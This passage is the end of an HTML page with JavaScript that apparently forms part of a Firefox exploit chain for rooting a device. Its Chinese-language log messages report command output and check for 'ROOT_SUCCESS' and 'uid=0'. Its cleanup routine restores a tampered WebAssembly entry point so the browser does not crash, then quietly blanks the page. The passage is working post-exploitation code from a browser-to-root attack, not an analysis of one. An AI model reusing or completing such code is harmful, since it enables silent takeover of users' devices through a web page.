    pollRet: commandPollResult.ret,
    hasRootSuccess: commandOutput.indexOf('ROOT_SUCCESS') >= 0,
    hasUid0: commandOutput.indexOf('uid=0') >= 0
  });

  // Display final output
  logOk('═══════════════════════════════════');
  logOk('命令输出:');
  const outputLines = commandOutput.split('\n');
  for (const line of outputLines) {
    if (line.indexOf('ROOT_SUCCESS') >= 0) {
      logOk(line);
    } else if (line.indexOf('uid=0') >= 0) {
      logOk(line);
    } else {
      logRaw('  ' + line);
    }
  }
  logOk('退出状态: ' + commandStatus);
  logOk('═══════════════════════════════════');

  if (commandOutput.indexOf('ROOT_SUCCESS') >= 0) {
    logOk('Root 成功!');
  } else if (commandOutput.indexOf('uid=0') >= 0) {
    logOk('已获取 root 权限 (uid=0)!');
  } else {
    logWarn('未检测到 ROOT_SUCCESS 标记，请检查输出');
  }

  // ── Cleanup: restore WASM entry to prevent Firefox crash ──
  dbgLog('[Cleanup] Restoring WASM unchecked_entry to original value');
  if (_wasmRestoreFn) _wasmRestoreFn();
  keep.length = 0;
  dbgLog('[Cleanup] Done — Firefox should not crash');
  logOk('');
  logOk('页面将在 3 秒后自动关闭...');
  setTimeout(() => { location.replace('about:blank'); }, 3000);
}
</script>
</body>
</html>
